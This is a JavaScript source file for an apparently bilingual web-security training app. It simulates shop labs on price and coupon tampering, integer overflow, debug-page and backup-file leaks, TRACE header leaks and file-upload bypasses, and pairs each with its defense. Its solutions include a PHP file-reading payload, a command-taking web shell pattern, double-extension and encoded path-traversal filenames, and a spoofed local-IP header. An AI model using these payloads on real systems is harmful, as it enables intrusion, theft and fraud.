      summary: L('The app only blocks using the same coupon twice in a row. Alternate two coupons and apply each as often as you like.', '应用只阻止“连续两次”使用同一张优惠券。交替使用两张，每张想用几次就用几次。'),
      lab: {
        fields: [{ id: 'c', label: L('Coupons in order (comma-separated)', '依次使用的优惠券（逗号分隔）'), default: 'SIGNUP30,NEWCUST5,SIGNUP30' }],
        presets: [
          { label: 'SIGNUP30,SIGNUP30', values: { c: 'SIGNUP30,SIGNUP30' } },
          { label: L('Alternate', '交替'), values: { c: 'SIGNUP30,NEWCUST5,SIGNUP30' } },
        ],
        defense: { label: L('Rule', '规则'), off: L('Not the same as last', '不能与上一张相同'), on: L('Each coupon once', '每张只能用一次') },
        run({ values, defended }) {
          const r = applyCoupons(values.c.split(','), { strict: defended });
          return { request: values.c.split(',').map((c) => `POST /cart/coupon  coupon=${c.trim()}`).join('\n'), log: r.log, response: `Total: ${money(r.total)}`, ...(r.total < JACKET - Math.round(JACKET * 0.3) - 500 ? verdict(true, 'Discounts stacked beyond what the shop intended.', '折扣叠加超出了商店的本意。') : defended ? verdict(false, 'Each coupon counts once per order.', '每张优惠券每单只算一次。') : neutral('Normal discounts.', '正常折扣。')) };
        },
      },
    },
    {
      id: 'workflow',
      title: L('Skipping a workflow step', '跳过流程步骤'),
      summary: L('Checkout redirects to /cart/order-confirmation?order-confirmed=true after payment. What if you request it directly?', '结账付款后会重定向到 /cart/order-confirmation?order-confirmed=true。如果你直接请求它会怎样？'),
      lab: {
        fields: [{ id: 'p', label: L('Request', '请求'), default: 'GET /cart/order-confirmation?order-confirmed=true' }],
        presets: [
          { label: 'POST /cart/checkout', values: { p: 'POST /cart/checkout' } },
          { label: L('Jump to confirmation', '直接跳到确认页'), values: { p: 'GET /cart/order-confirmation?order-confirmed=true' } },
        ],
        defense: { label: L('Order state', '订单状态'), off: L('Trust the URL', '信任 URL'), on: L('Server-side state machine', '服务端状态机') },
        run({ values, defended }) {
          const confirm = /order-confirmation\?order-confirmed=true/.test(values.p);
          if (!confirm) return { request: values.p, log: [L('store credit $100 < $1337', '商店余额 $100 < $1337')], response: 'HTTP/1.1 303\nLocation: /cart?err=INSUFFICIENT_FUNDS', ...neutral('Not enough credit.', '余额不足。') };
          if (defended) return { request: values.p, log: [L('🛡 order state = UNPAID', '🛡 订单状态 = 未付款')], response: 'HTTP/1.1 400 "Order not paid"', ...verdict(false, 'The server knows nothing was paid.', '服务器知道你什么都没付。') };
          return { request: values.p, log: [L('order marked complete', '订单被标记为完成')], response: 'Your order is on its way!\nLightweight jacket × 1', ...verdict(true, 'Order placed without paying.', '没付钱就下单成功了。') };
        },
      },
    },
  ],
  challenges: [
    {
      title: L('Set your own price', '自己定价'),
      goal: L('You have $100 of store credit. Buy the $1337 jacket by editing the add-to-cart request.', '你有 $100 的商店余额。通过修改加入购物车的请求，买下 $1337 的夹克。'),
      fields: [{ id: 'r', label: L('Raw request', '原始请求'), rows: 3, default: 'POST /cart HTTP/1.1\n\nproductId=1&redir=PRODUCT&quantity=1&price=133700' }],
      run({ r }) {
        const q = parseReq(r);
        const price = parseInt(q.form.get('price'), 10);
        const qty = parseInt(q.form.get('quantity'), 10) || 0;
        const total = (Number.isFinite(price) ? price : JACKET) * qty;
        return { log: [L(`total ${money(total)}, credit $100.00`, `总价 ${money(total)}，余额 $100.00`)], response: q.form.get('productId') === '1' && qty >= 1 && total >= 0 && total <= 10000 ? 'Order placed: Lightweight jacket' : 'HTTP/1.1 303 INSUFFICIENT_FUNDS', ok: q.form.get('productId') === '1' && qty >= 1 && total >= 0 && total <= 10000 };
      },
      check: (v, o) => o.ok,
      hint: L('One of these parameters should never come from the browser.', '这些参数中，有一个本不该来自浏览器。'),
      solution: 'POST /cart HTTP/1.1\n\nproductId=1&redir=PRODUCT&quantity=1&price=1',
      explain: L('Prices, discounts and totals must be computed on the server from trusted data. Hidden fields are visible and editable to anyone with a proxy.', '价格、折扣和总价必须由服务器基于可信数据计算。隐藏字段对任何使用代理的人都是可见且可修改的。'),
    },
    {
      title: L('Stack the coupons', '叠加优惠券'),
      goal: L('Jacket $1337, store credit $100. Coupons: NEWCUST5 ($5 off) and SIGNUP30 (30% of the list price off). The same coupon can’t be applied twice in a row. Get the total to $100 or less.', '夹克 $1337，余额 $100。优惠券：NEWCUST5（减 $5）和 SIGNUP30（按原价减 30%）。同一张券不能连续使用两次。把总价降到 $100 或以下。'),
      fields: [{ id: 'c', label: L('Coupons in order (comma-separated)', '依次使用的优惠券（逗号分隔）'), default: 'SIGNUP30' }],
      run({ c }) {
        const r = applyCoupons(c.split(','));
        return { log: r.log, response: `Total: ${money(r.total)}`, total: r.total };
      },
      check: (v, o) => o.total <= 10000,
      hint: L('“Not twice in a row” is not “once”. Put the other coupon in between.', '“不能连续两次”不等于“只能一次”。在中间插入另一张券。'),
      solution: 'SIGNUP30,NEWCUST5,SIGNUP30,NEWCUST5,SIGNUP30,NEWCUST5,SIGNUP30',
      explain: L('The rule checked the wrong invariant. Model what the business actually wants (each coupon once per order) and enforce exactly that.', '规则检查了错误的不变量。把业务真正想要的规则（每单每张券只能用一次）建模出来，并严格执行。'),
    },
    {
      title: L('Overflow the cart', '让购物车溢出'),
      goal: L('The cart total is a 32-bit signed integer of cents. Jackets cost $1337.00, socks $12.50. Make the total land between $0.00 and $100.00 with at least one jacket.', '购物车总价是以“分”为单位的 32 位有符号整数。夹克 $1337.00，袜子 $12.50。在至少有一件夹克的情况下，让总价落在 $0.00 到 $100.00 之间。'),
      fields: [
        { id: 'j', label: L('jackets', '夹克数量'), default: '1' },
        { id: 's', label: L('socks', '袜子数量'), default: '0' },
      ],
      run({ j, s }) {
        const jn = Math.max(parseInt(j, 10) || 0, 0);
        const sn = Math.max(parseInt(s, 10) || 0, 0);
        const t = int32(JACKET * jn + 1250 * sn);
        return { log: [`${JACKET} × ${jn} + 1250 × ${sn} = ${JACKET * jn + 1250 * sn} → int32 ${t}`], response: `Total: ${money(t)}`, t, jn };
      },
      check: (v, o) => o.jn > 0 && o.t >= 0 && o.t <= 10000,
      hint: L('2³² = 4294967296 cents. Find a jacket count whose total wraps to a small negative number, then add socks to climb back above zero.', '2³² = 4294967296 分。找到一个夹克数量，让总价回绕成一个绝对值很小的负数，再加袜子把它拉回零以上。'),
      solution: '32123 jackets + 98 socks = $3.04',
      explain: L('Each add-to-cart request looked valid (quantity ≤ 99), but the sum overflowed. Use 64-bit or decimal types, cap totals, and validate the final amount, not just each step.', '每个加入购物车的请求看上去都合法（数量 ≤ 99），但累加后溢出了。使用 64 位或十进制类型，限制总额，并校验最终金额，而不只是每一步。'),
    },
  ],
  cases: [
    { year: '2016', ref: L('Uber (bug bounty)', 'Uber（漏洞赏金）'), title: L('Free rides with an invalid payment method', '用无效支付方式免费乘车'), what: L('Security researcher Anand Prakash reported that by changing the payment method in the ride request to an invalid value, rides could be taken without being charged. Uber fixed it and paid a bounty.', '安全研究员 Anand Prakash 报告称，只要把叫车请求中的支付方式改成一个无效值，就能乘车而不被扣费。Uber 修复了这个问题并支付了赏金。'), lesson: L('Business rules (“every ride is paid”) must be enforced on the server for every edge case, including bad input.', '业务规则（“每次乘车都要付款”）必须在服务端针对每种边界情况执行，包括错误的输入。') },
  ],
};

/* ====================================================== Information disclosure */
const infoDisclosure = {
  variants: [
    {
      id: 'errors',
      title: L('Verbose errors', '详细的错误信息'),
      summary: L('Send something unexpected, such as text where a number goes. A stack trace may reveal the framework and version, which you then look up in vulnerability databases.', '发送意料之外的内容，比如在该填数字的地方填文本。堆栈跟踪可能会泄露框架和版本，然后你就可以去漏洞库里查。'),
      lab: {
        fields: [{ id: 'id', label: 'productId', default: 'abc' }],
        presets: [
          { label: '1', values: { id: '1' } },
          { label: 'abc', values: { id: 'abc' } },
        ],
        defense: { label: L('Error page', '错误页面'), off: L('Stack trace', '堆栈跟踪'), on: L('Generic', '通用页面') },
        run({ values, defended }) {
          const bad = !/^\d+$/.test(values.id);
          if (!bad) return { request: `GET /product?productId=${values.id}`, log: [], response: 'HTTP/1.1 200 OK\n\n(product page)', ...neutral('Normal.', '正常。') };
          if (defended) return { request: `GET /product?productId=${values.id}`, log: [L('details logged server-side', '细节记录在服务端日志')], response: 'HTTP/1.1 500\n\nSomething went wrong. Reference: 7f3a2c', ...verdict(false, 'A reference ID instead of internals.', '只给一个参考编号，不暴露内部信息。') };
          return { request: `GET /product?productId=${values.id}`, log: [], response: `HTTP/1.1 500 Internal Server Error\n\njava.lang.NumberFormatException: For input string: "${values.id}"\n\tat java.lang.Integer.parseInt(Integer.java:652)\n\tat lab.ProductController.show(ProductController.java:41)\n\nApache Struts 2 2.3.31`, ...verdict(true, 'Framework and exact version revealed.', '框架和精确版本都泄露了。') };
        },
      },
    },
    {
      id: 'debug',
      title: L('Debug pages', '调试页面'),
      summary: L('Developers leave debug pages (phpinfo, /actuator, /debug) reachable. HTML comments often point at them.', '开发者会把调试页面（phpinfo、/actuator、/debug）留在可访问的位置，HTML 注释里常常会指向它们。'),
      lab: {
        fields: [{ id: 'p', label: L('Path', '路径'), default: '/cgi-bin/phpinfo.php' }],
        presets: [
          { label: L('View source', '查看源码'), values: { p: '/' } },
          { label: 'phpinfo.php', values: { p: '/cgi-bin/phpinfo.php' } },
        ],
        defense: { label: L('Deployment', '部署'), off: L('Debug left on', '保留调试'), on: L('Production build', '生产构建') },
        run({ values, defended }) {
          if (values.p === '/') return { request: 'GET /', log: [], response: 'HTTP/1.1 200 OK\n\n<!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->\n<h1>Shop</h1>', ...neutral('Read the comments.', '读一读注释。') };
          if (values.p !== '/cgi-bin/phpinfo.php' || defended) return { request: `GET ${values.p}`, log: [], response: 'HTTP/1.1 404 Not Found', ...(defended ? verdict(false, 'Not deployed.', '没有部署。') : neutral('Not found.', '未找到。')) };
          return { request: `GET ${values.p}`, log: [], response: 'HTTP/1.1 200 OK\n\nPHP Version 7.4.3\n…\nEnvironment\nSECRET_KEY  r7cX0vQ2nB9w\nDB_HOST     10.0.4.12', ...verdict(true, 'Environment variables, including a secret key.', '环境变量都出来了，包括一个密钥。') };
        },
      },
    },
    {
      id: 'backup',
      title: L('Backup and source files', '备份与源码文件'),
      summary: L('Editors and admins leave copies: .bak, ~, .old, .swp. The web server serves them as text, source code and credentials included.', '编辑器和管理员会留下副本：.bak、~、.old、.swp。Web 服务器把它们当作文本直接返回，连源码和凭证一起。'),
      lab: {
        fields: [{ id: 'p', label: L('Path', '路径'), default: '/backup/ProductTemplate.java.bak' }],
        presets: [
          { label: '/robots.txt', values: { p: '/robots.txt' } },
          { label: '/backup', values: { p: '/backup' } },
          { label: '.java.bak', values: { p: '/backup/ProductTemplate.java.bak' } },
        ],
        defense: { label: L('Server', '服务器'), off: L('Serves everything', '提供所有文件'), on: L('Build artefacts only', '只提供构建产物') },
        run({ values, defended }) {
          const map = {
            '/robots.txt': 'User-agent: *\nDisallow: /backup',
            '/backup': 'Index of /backup\n  ProductTemplate.java.bak',
            '/backup/ProductTemplate.java.bak': 'ConnectionBuilder.from("org.postgresql.Driver", "postgresql", "localhost", 5432, "postgres", "postgres", "q8vgz0d3hY")',
          };
          const body = map[values.p];
          if (!body || (defended && values.p.startsWith('/backup'))) return { request: `GET ${values.p}`, log: [], response: 'HTTP/1.1 404', ...(defended ? verdict(false, 'Backups never reach the web root.', '备份文件根本不在网站根目录里。') : neutral('Not found.', '未找到。')) };
          return { request: `GET ${values.p}`, log: [], response: `HTTP/1.1 200 OK\n\n${body}`, ...(values.p.endsWith('.bak') ? verdict(true, 'A hard-coded database password.', '一个硬编码的数据库密码。') : neutral('Keep following the trail.', '顺着线索继续。')) };
        },
      },
    },
    {
      id: 'trace',
      title: L('TRACE and hidden headers', 'TRACE 与隐藏请求头'),
      summary: L('The HTTP TRACE method echoes the request as the server received it, including headers a front-end proxy adds. That can reveal how the app decides who is “local”.', 'HTTP TRACE 方法会原样回显服务器收到的请求，包括前端代理添加的请求头。这可能暴露应用如何判断谁是“本地”用户。'),
      lab: {
        fields: [{ id: 'm', label: L('Method', '方法'), default: 'TRACE' }],
        presets: [
          { label: 'GET', values: { m: 'GET' } },
          { label: 'TRACE', values: { m: 'TRACE' } },
        ],
        defense: { label: 'TRACE', off: L('Enabled', '启用'), on: L('Disabled', '禁用') },
        run({ values, defended }) {
          const m = values.m.trim().toUpperCase();
          if (m !== 'TRACE') return { request: `${m} /admin`, log: [], response: 'HTTP/1.1 401 "Admin interface only available to local users"', ...neutral('Local users only. How does it know?', '只限本地用户。它是怎么判断的？') };
          if (defended) return { request: 'TRACE /admin', log: [], response: 'HTTP/1.1 405 Method Not Allowed', ...verdict(false, 'Nothing echoed.', '没有任何回显。') };
          return { request: 'TRACE /admin', log: [], response: 'HTTP/1.1 200 OK\n\nTRACE /admin HTTP/1.1\nHost: shop.example\nX-Custom-IP-Authorization: 203.0.113.50', ...verdict(true, 'The proxy adds X-Custom-IP-Authorization. You can send it yourself.', '代理添加了 X-Custom-IP-Authorization。你可以自己发送它。') };
        },
      },
    },
  ],
  challenges: [
    {
      title: L('Name that version', '说出版本号'),
      goal: L('Find which version of the framework this shop runs. Product pages live at /product?productId=1.', '找出这家商店运行的框架版本。商品页面位于 /product?productId=1。'),
      fields: [
        { id: 'p', label: L('Request path', '请求路径'), default: '/product?productId=1' },
        { id: 'a', label: L('Version number', '版本号'), default: '' },
      ],
      run({ p, a }) {
        const m = /productId=([^&]*)/.exec(p);
        const bad = m && !/^\d+$/.test(m[1]);
        return { log: a ? [a.trim() === '2.3.31' ? L('✓ correct version', '✓ 版本正确') : L('✗ not that version', '✗ 不是这个版本')] : [], response: bad ? `HTTP/1.1 500\n\njava.lang.NumberFormatException: For input string: "${m[1]}"\n\tat lab.ProductController.show(ProductController.java:41)\n\nApache Struts 2 2.3.31` : 'HTTP/1.1 200 OK\n\n(product page)' };
      },
      check: (v) => v.a.trim() === '2.3.31',
      hint: L('Give productId something that isn’t a number.', '给 productId 一个不是数字的值。'),
      solution: '/product?productId=abc  →  2.3.31',
      explain: L('Version strings turn “maybe vulnerable” into a precise CVE search. Log errors server-side and show a generic page.', '版本字符串会把“可能有漏洞”变成一次精确的 CVE 搜索。在服务端记录错误，对外只显示通用页面。'),
    },
    {
      title: L('Follow the backup trail', '顺着备份找线索'),
      goal: L('Somewhere on this site is a source-code backup with the database password. Find it and enter the password.', '这个网站上某处有一份包含数据库密码的源码备份。找到它并输入密码。'),
      fields: [
        { id: 'p', label: L('Path', '路径'), default: '/' },
        { id: 'a', label: L('Database password', '数据库密码'), default: '' },
      ],
      run({ p, a }) {
        const map = {
          '/': '<h1>Shop</h1>',
          '/robots.txt': 'User-agent: *\nDisallow: /backup',
          '/backup': 'Index of /backup\n  ProductTemplate.java.bak',
          '/backup/': 'Index of /backup\n  ProductTemplate.java.bak',
          '/backup/ProductTemplate.java.bak': '… "postgres", "postgres", "q8vgz0d3hY")',
        };
        return { log: a ? [a.trim() === 'q8vgz0d3hY' ? L('✓ correct', '✓ 正确') : L('✗ wrong', '✗ 不对')] : [], response: map[p.trim()] ? `HTTP/1.1 200 OK\n\n${map[p.trim()]}` : 'HTTP/1.1 404' };
      },
      check: (v) => v.a.trim() === 'q8vgz0d3hY',
      hint: L('Which file tells crawlers where not to look?', '哪个文件会告诉爬虫“别看这里”？'),
      solution: '/robots.txt → /backup → /backup/ProductTemplate.java.bak  →  q8vgz0d3hY',
      explain: L('robots.txt is a public map of what a site would rather hide. Keep secrets out of source code and keep backups off the web server.', 'robots.txt 是一张公开的地图，标出了网站更想藏起来的东西。不要把密钥写进源码，也不要把备份放在 Web 服务器上。'),
    },
    {
      title: L('Become a local user', '变成本地用户'),
      goal: L('/admin is “only available to local users”. Work out how the app decides, then delete carlos.', '/admin“只对本地用户开放”。弄清楚应用如何判断，然后删除 carlos。'),
      fields: [{ id: 'r', label: L('Raw request', '原始请求'), rows: 3, default: 'GET /admin HTTP/1.1\nHost: shop.example' }],
      run({ r }) {
        const q = parseReq(r);
        if (q.method === 'TRACE') return { log: [], response: `HTTP/1.1 200 OK\n\n${r.trim()}\nX-Custom-IP-Authorization: 203.0.113.50`, a: null };
        const ip = q.headers['x-custom-ip-authorization'];
        if (ip !== '127.0.0.1') return { log: [ip ? L(`proxy overwrote nothing; app sees ${ip}`, `应用看到的是 ${ip}`) : ''].filter(Boolean), response: 'HTTP/1.1 401 "Admin interface only available to local users"', a: null };
        if (q.path === '/admin') return { log: [L('app: client is 127.0.0.1', '应用：客户端是 127.0.0.1')], response: ADMIN_PAGE_L, a: null };
        const a = q.path === '/admin/delete' && q.query.get('username');
        return { log: [L('app: client is 127.0.0.1', '应用：客户端是 127.0.0.1')], response: a ? `HTTP/1.1 302\n\nUser ${a} deleted` : 'HTTP/1.1 404', a };
      },
      check: (v, o) => o.a === 'carlos',
      hint: L('Try the TRACE method to see what the proxy adds. Then add that header yourself with a local IP.', '用 TRACE 方法看看代理添加了什么。然后自己带上这个请求头，填一个本地 IP。'),
      solution: 'GET /admin/delete?username=carlos HTTP/1.1\nHost: shop.example\nX-Custom-IP-Authorization: 127.0.0.1',
      explain: L('TRACE leaked an internal header; the proxy appended its value but the app trusted the client’s copy. Disable TRACE and never base access control on request headers.', 'TRACE 泄露了一个内部请求头；代理确实添加了它的值，但应用信任的是客户端发来的那份。禁用 TRACE，也永远不要用请求头做访问控制。'),
    },
  ],
  cases: [
    { year: '2016', ref: L('Uber', 'Uber'), title: L('Cloud keys in a code repository', '代码仓库里的云密钥'), what: L('Attackers found AWS credentials in a private GitHub repository used by Uber engineers and used them to download data on about 57 million riders and drivers from cloud storage. Uber paid the attackers $100,000 and did not disclose the breach until late 2017.', '攻击者在 Uber 工程师使用的一个私有 GitHub 仓库中找到了 AWS 凭证，并用它们从云存储下载了约 5700 万名乘客和司机的数据。Uber 向攻击者支付了 10 万美元，直到 2017 年底才披露这次泄露。'), lesson: L('Secrets in source code are information disclosure waiting to happen. Use a secrets manager and scan repositories.', '源码中的密钥，就是一次等待发生的信息泄露。使用密钥管理服务，并扫描代码仓库。') },
  ],
};
const ADMIN_PAGE_L = 'HTTP/1.1 200 OK\n\n<h1>Admin panel</h1>\nwiener  <a href="/admin/delete?username=wiener">Delete</a>\ncarlos  <a href="/admin/delete?username=carlos">Delete</a>';

/* ====================================================== File upload */
const SECRET = 'Zq8Lm2Vt';
function php(body) {
  if (!/<\?php/i.test(body)) return null;
  if (/(file_get_contents|readfile)\s*\(\s*['"]\/home\/carlos\/secret['"]\s*\)|system\s*\(\s*['"]cat \/home\/carlos\/secret['"]\s*\)/i.test(body)) return SECRET;
  if (/system\s*\(\s*['"]whoami['"]\s*\)/i.test(body)) return 'www-data';
  if (/system\s*\(\s*\$_GET\[['"]cmd['"]\]\s*\)/i.test(body)) return L('(web shell ready: ?cmd=…)', '（Web shell 就绪：?cmd=…）');
  return L('(PHP ran)', '（PHP 已执行）');
}
const EXEC_EXT = /\.(php|phtml|php5)$/i;
const IMG_TYPES = ['image/jpeg', 'image/png', 'image/gif'];

function store({ name, type, body }, rules) {
  const log = [];
  let n = name;
  if (rules.type && !IMG_TYPES.includes(type.trim().toLowerCase())) return { blocked: L(`Content-Type ${type} not allowed`, `不允许的 Content-Type：${type}`) };
  if (rules.blockExt && /\.php$/i.test(n)) return { blocked: L('.php files are not allowed', '不允许 .php 文件') };
  if (rules.strip) {
    n = n.replace(/\.php/i, '');
    log.push(L(`after stripping .php once: ${n}`, `删除一次 .php 后：${n}`));
  }
  if (rules.magic && !/^(GIF8[79]a|\xFF\xD8\xFF|\x89PNG)/.test(body)) return { blocked: L('not a real image (magic bytes)', '不是真正的图片（魔数校验）') };
  if (rules.noTraversal && n.includes('../')) return { blocked: L('../ not allowed', '不允许 ../') };
  n = decodeOnce(n);
  const dir = rules.dir || '/files/avatars/';
  const segs = (dir + n).split('/');
  const out = [];
  for (const s of segs) {
    if (s === '..') out.pop();
    else if (s) out.push(s);
  }
  const path = '/' + out.join('/');
  const execDir = rules.nonExecDir ? !path.startsWith(rules.nonExecDir) : true;
  const runs = execDir && EXEC_EXT.test(path);
  log.push(L(`saved as ${path}`, `保存为 ${path}`));
  return { path, runs, log, output: runs ? php(body) : null };
}
const uploadReq = (v) => `POST /my-account/avatar HTTP/1.1\nContent-Type: multipart/form-data; boundary=X\n\n--X\nContent-Disposition: form-data; name="avatar"; filename="${v.name}"\nContent-Type: ${v.type}\n\n${v.body}\n--X--`;
const upFields = (name, type, body) => [
  { id: 'name', label: L('filename', '文件名'), default: name },
  { id: 'type', label: 'Content-Type', default: type },
  { id: 'body', label: L('File content', '文件内容'), default: body, rows: 2 },
];
const SAFE_UP = { label: L('Upload handling', '上传处理'), off: L('As described', '如上所述'), on: L('Re-encode image, random name, no-exec storage', '重新编码图片、随机文件名、不可执行的存储') };
function upLab(rules, name, type, body, presets) {
  return {
    fields: upFields(name, type, body),
    presets,
    defense: SAFE_UP,
    run({ values, defended }) {
      const request = uploadReq(values);
      if (defended) return { request, log: [L('image decoded and re-encoded as PNG; stored as /cdn/9f2c1e.png on a static host', '图片被解码并重新编码为 PNG；以 /cdn/9f2c1e.png 存放在静态主机上')], response: /<\?php/i.test(values.body) && !/^(GIF8|\xFF\xD8|\x89PNG)/.test(values.body) ? 'HTTP/1.1 400 "Not an image"' : 'HTTP/1.1 200 OK\n\nGET /cdn/9f2c1e.png → (pixels only)', ...verdict(false, 'Nothing executable survives re-encoding.', '重新编码后，不会留下任何可执行的东西。') };
      const r = store(values, rules);
      if (r.blocked) return { request, log: [r.blocked], response: 'HTTP/1.1 403 "Sorry, upload rejected"', ...neutral('Rejected. Look for a gap in the check.', '被拒绝了。找找检查中的漏洞。') };
      const out = r.output;
      return { request, log: r.log, response: `HTTP/1.1 200 OK\n\nGET ${r.path} →\n${r.runs ? (typeof out === 'string' ? out : `${out.en}`) : '(served as a static file)'}`, ...(r.runs ? verdict(true, 'Your file ran as PHP on the server.', '你的文件在服务器上被当作 PHP 执行了。') : neutral('Stored, but not executed.', '已保存，但没有被执行。')) };
    },
  };
}
const SHELL = "<?php echo file_get_contents('/home/carlos/secret'); ?>";

const fileUpload = {
  variants: [
    {
      id: 'none',
      title: L('No validation', '没有任何校验'),
      summary: L('The server saves whatever you send under its original name, in a folder where .php files execute.', '服务器把你发送的任何文件按原名保存在一个会执行 .php 的目录里。'),
      lab: upLab({}, 'shell.php', 'application/x-php', SHELL, [{ label: 'shell.php', values: { name: 'shell.php', type: 'application/x-php', body: SHELL } }, { label: 'cat.png', values: { name: 'cat.png', type: 'image/png', body: '\x89PNG…' } }]),
    },
    {
      id: 'type',
      title: L('Content-Type check only', '只检查 Content-Type'),
      summary: L('The server trusts the Content-Type header of the uploaded part. You control that header.', '服务器信任上传部分的 Content-Type 头。而这个头由你控制。'),
      lab: upLab({ type: true }, 'shell.php', 'application/x-php', SHELL, [{ label: 'application/x-php', values: { name: 'shell.php', type: 'application/x-php', body: SHELL } }, { label: 'image/png', values: { name: 'shell.php', type: 'image/png', body: SHELL } }]),
    },
    {
      id: 'strip',
      title: L('Extension stripped once', '扩展名只删一次'),
      summary: L('Names ending in .php are rejected. Names that pass are then “cleaned” by removing .php once. Hide one .php inside another.', '以 .php 结尾的文件名会被拒绝。通过检查的文件名随后会被“清理”：删除一次 .php。把一个 .php 藏在另一个里面。'),
      lab: upLab({ strip: true, blockExt: true }, 'shell.p.phphp', 'image/png', SHELL, [{ label: 'shell.php', values: { name: 'shell.php', type: 'image/png', body: SHELL } }, { label: 'shell.p.phphp', values: { name: 'shell.p.phphp', type: 'image/png', body: SHELL } }]),
    },
    {
      id: 'magic',
      title: L('Polyglot (magic bytes)', '多语言文件（魔数）'),
      summary: L('The server checks that the file starts like an image. A file can start with GIF89a and still contain PHP further down.', '服务器检查文件开头是否像一张图片。一个文件完全可以以 GIF89a 开头，后面依然包含 PHP。'),
      lab: upLab({ magic: true }, 'shell.php', 'image/gif', `GIF89a${SHELL}`, [{ label: L('Plain PHP', '纯 PHP'), values: { name: 'shell.php', type: 'image/gif', body: SHELL } }, { label: 'GIF89a + PHP', values: { name: 'shell.php', type: 'image/gif', body: `GIF89a${SHELL}` } }]),
    },
    {
      id: 'traversal',
      title: L('Escaping the upload folder', '逃出上传目录'),
      summary: L('The avatars folder is configured not to execute scripts, but the folder above it does. A traversal in the filename moves the file there.', '头像目录被配置为不执行脚本，但它的上一级目录会执行。文件名里的路径遍历可以把文件挪过去。'),
      lab: upLab({ noTraversal: true, nonExecDir: '/files/avatars/' }, '..%2fshell.php', 'image/png', SHELL, [{ label: 'shell.php', values: { name: 'shell.php', type: 'image/png', body: SHELL } }, { label: '../shell.php', values: { name: '../shell.php', type: 'image/png', body: SHELL } }, { label: '..%2fshell.php', values: { name: '..%2fshell.php', type: 'image/png', body: SHELL } }]),
    },
  ],
  challenges: [
    {
      title: L('Lie about the type', '谎报类型'),
      goal: L('Avatar uploads only accept image/jpeg, image/png or image/gif (checked via the Content-Type of the part). Read /home/carlos/secret.', '头像上传只接受 image/jpeg、image/png 或 image/gif（通过上传部分的 Content-Type 检查）。读取 /home/carlos/secret。'),
      fields: upFields('cat.png', 'image/png', '\x89PNG…'),
      run(v) {
        const r = store(v, { type: true });
        return r.blocked ? { log: [r.blocked], response: 'HTTP/1.1 403' } : { log: r.log, response: `GET ${r.path} → ${r.runs ? (typeof r.output === 'string' ? r.output : r.output.en) : '(static file)'}`, out: r.output };
      },
      check: (v, o) => o.out === SECRET,
      hint: L('Upload a .php file whose content reads the secret, and set Content-Type to an image type.', '上传一个内容会读取 secret 的 .php 文件，并把 Content-Type 设为图片类型。'),
      solution: `filename: shell.php\nContent-Type: image/png\ncontent: ${SHELL}`,
      explain: L('Content-Type is a claim made by the client. Decide by inspecting (and re-encoding) the content, and never store uploads where they can execute.', 'Content-Type 只是客户端的一个声明。要通过检查（并重新编码）内容来判断，而且永远不要把上传文件存放在能执行的地方。'),
    },
    {
      title: L('Two filters, two tricks', '两层过滤，两个技巧'),
      goal: L('The server rejects names ending in .php, then “cleans” the name by removing .php once, and requires the content to start with image magic bytes. Read /home/carlos/secret.', '服务器拒绝以 .php 结尾的文件名，然后通过删除一次 .php 来“清理”文件名，并要求内容以图片魔数开头。读取 /home/carlos/secret。'),
      fields: upFields('shell.php', 'image/gif', SHELL),
      run(v) {
        const r = store(v, { strip: true, blockExt: true, magic: true });
        return r.blocked ? { log: [r.blocked], response: 'HTTP/1.1 403' } : { log: r.log, response: `GET ${r.path} → ${r.runs ? (typeof r.output === 'string' ? r.output : r.output.en) : '(static file)'}`, out: r.output };
      },
      check: (v, o) => o.out === SECRET,
      hint: L('Name: pass the check, then let the clean-up create .php for you. Content: GIF files start with GIF89a.', '文件名：先通过检查，再让“清理”替你造出 .php。内容：GIF 文件以 GIF89a 开头。'),
      solution: `filename: shell.p.phphp\ncontent: GIF89a${SHELL}`,
      explain: L('Validating before sanitising means the checked name is not the stored name. Each filter also looked at one property in isolation. Generate your own filename and re-encode images server-side.', '先校验后清理，意味着被检查的文件名并不是最终存储的文件名。而且每个过滤器都只孤立地看一个属性。由服务器自己生成文件名，并在服务端重新编码图片。'),
    },
    {
      title: L('Out of the sandbox folder', '逃出沙箱目录'),
      goal: L('/files/avatars/ does not execute scripts; /files/ does. The server rejects filenames containing “../” but URL-decodes the name afterwards. Read /home/carlos/secret.', '/files/avatars/ 不执行脚本；/files/ 会执行。服务器拒绝包含“../”的文件名，但之后会对文件名做 URL 解码。读取 /home/carlos/secret。'),
      fields: upFields('shell.php', 'image/png', SHELL),
      run(v) {
        const r = store(v, { noTraversal: true, nonExecDir: '/files/avatars/' });
        return r.blocked ? { log: [r.blocked], response: 'HTTP/1.1 403' } : { log: r.log, response: `GET ${r.path} → ${r.runs ? (typeof r.output === 'string' ? r.output : r.output.en) : '(served as text)'}`, out: r.output };
      },
      check: (v, o) => o.out === SECRET,
      hint: L('Encode the slash in ../ so the check misses it.', '把 ../ 中的斜杠编码，让检查发现不了。'),
      solution: `filename: ..%2fshell.php\ncontent: ${SHELL}`,
      explain: L('The filename is attacker input in two ways: as an extension and as a path. Never use it; generate a random name and keep uploads in storage that cannot execute.', '文件名在两方面都是攻击者的输入：既是扩展名，也是路径。永远不要使用它；生成随机文件名，并把上传文件放在不可执行的存储中。'),
    },
  ],
  cases: [
    { year: '2017', ref: 'CVE-2017-5638', title: L('Equifax (Apache Struts)', 'Equifax（Apache Struts）'), what: L('The Jakarta multipart parser in Apache Struts 2, the code that handles file-upload requests, evaluated an OGNL expression placed in a malformed Content-Type header, giving remote code execution. Equifax had not applied the available patch; attackers stole personal data of about 147 million people.', 'Apache Struts 2 中处理文件上传请求的 Jakarta multipart 解析器，会执行放在畸形 Content-Type 头中的 OGNL 表达式，导致远程代码执行。Equifax 没有安装已发布的补丁，攻击者窃取了约 1.47 亿人的个人数据。'), lesson: L('Upload handling code is attack surface even before your validation runs. Patch quickly.', '上传处理代码在你的校验运行之前就已经是攻击面。要尽快打补丁。') },
    { year: '2018', ref: 'CVE-2018-9206', title: L('jQuery File Upload', 'jQuery File Upload'), what: L('The widely used jQuery File Upload plugin relied on an .htaccess file to stop uploaded scripts from running. Apache 2.3.9 and later ignore .htaccess by default, so for years anyone could upload and execute PHP on servers using the plugin’s example server code.', '广泛使用的 jQuery File Upload 插件依靠 .htaccess 文件来阻止上传的脚本运行。而 Apache 2.3.9 及以后版本默认忽略 .htaccess，因此多年来，任何人都能在使用该插件示例服务端代码的服务器上上传并执行 PHP。'), lesson: L('A defence that depends on server configuration you don’t control is not a defence.', '依赖于你无法控制的服务器配置的防御，不算防御。') },
  ],
};

